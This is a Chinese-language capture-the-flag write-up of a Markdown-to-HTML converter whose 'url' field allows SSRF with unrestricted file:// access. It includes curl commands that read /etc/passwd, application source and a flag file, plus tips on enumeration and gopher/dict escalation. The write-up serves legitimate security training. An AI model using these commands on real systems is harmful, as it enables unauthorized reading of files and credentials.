## 题解

### 入口与指纹

`Werkzeug/3.0.6` + `Python/3.8.20`，页面标题 **`Markdown to HTML Converter`**。

表单有两个输入，二选一：

```html
<form method="post" action="/convert">
  <label for="url">Enter URL:</label>
  <input type="url" name="url">
  <label for="markdown_text">Or enter Markdown text:</label>
  <textarea name="markdown_text">…</textarea>
</form>
```

转换结果回显在 `<div class="result">` 里：

```bash
curl -X POST --data-urlencode 'markdown_text=# Hi *x*' http://$T/convert
# <div class="result"><h1>Hi <em>x</em></h1></div>
```

### 关键观察

**1. `url` 参数是服务端抓取，且不限制协议。**

```bash
curl -X POST --data-urlencode 'url=http://127.0.0.1/' http://$T/convert
# 返回本机首页的 HTML（再被 markdown 渲染一遍）
```

说明服务端会去请求这个 URL。于是试 `file://`：

```bash
curl -X POST --data-urlencode 'url=file:///etc/passwd' http://$T/convert
# root:x:0:0:root:/root:/bin/bash …
```

**`file://` 完全放行**——这就是任意文件读。

**2. `markdown_text` 本身没有模板注入。**

`markdown_text={{7*7}}` 只是被 markdown 库当普通文本，输出 `{{7*7}}`；
所以真正的入口是 `url` 而不是 markdown 渲染。

### 利用链

```bash
T=$(head -1 .target)

# 1. 确认 SSRF
curl -sS -X POST --data-urlencode 'url=http://127.0.0.1/' "http://$T/convert"

# 2. 确认 file:// 可用
curl -sS -X POST --data-urlencode 'url=file:///etc/passwd' "http://$T/convert"

# 3. 读 flag
curl -sS -X POST --data-urlencode 'url=file:///flag.txt' "http://$T/convert" \
| sed -n '/class="result"/,$p'
```

```html
<div class="result"><p>flag{258839eb-75d8-46ee-a8c9-1ce7b91963f9}</p></div>
```

顺手确认了应用源码也能读：`file:///app/app.py` 会返回完整源码
（`import urllib.request` 等），说明确实是裸 `urllib.request.urlopen(url)`。

### flag 位置

容器内的 **`/flag.txt`**。`/flag`、`/FLAG.txt`、`/tmp/flag`、`/app/flag`
都不存在——文件名要试。

## 复盘

- **"输入 URL 让我抓"就是 SSRF，第一件事试 `file://`。**
  HTTP SSRF 只能打内网服务；协议不受限时直接升级成任意文件读。
- **转换器/预览类功能是 SSRF 高发点**（markdown 预览、图片抓取、PDF 渲染、
  RSS 导入）。判据是响应里出现目标内容。
- **markdown_text 是干扰项。** 我先测了 `{{7*7}}`，输出原样，说明渲染层没有
  SSTI；把注意力转到 `url` 才拿到结果。
- **flag 文件名要枚举。** 这题是 `/flag.txt`；`/flag`、`/FLAG.txt` 都是空的。
  拿到任意文件读后，优先试 `flag`/`flag.txt`/`FLAG.txt`/`/tmp/flag` 四个常见组合。
- **能读源码就说明实现。** `file:///app/app.py` 显示用的是 `urllib.request`，
  后续如果要做更复杂的利用（比如 gopher/dict），可以先确认它支持哪些协议。
